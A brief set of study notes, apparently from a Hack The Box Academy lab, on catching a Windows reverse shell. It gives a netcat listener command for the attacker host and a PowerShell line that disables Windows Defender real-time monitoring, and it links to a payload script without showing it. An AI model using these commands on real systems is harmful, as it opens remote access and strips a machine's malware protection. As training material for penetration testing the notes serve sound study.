
Host is listening, while target initiates connection.

Listen on Host
```shell-session
sudo nc -lvnp 443
```

There is a script: https://academy.hackthebox.com/module/115/section/1106

It is flagged by Windows Defender. Copy and paste in target.

Disable Windows Defender:
```powershell-session
Set-MpPreference -DisableRealtimeMonitoring $true
```

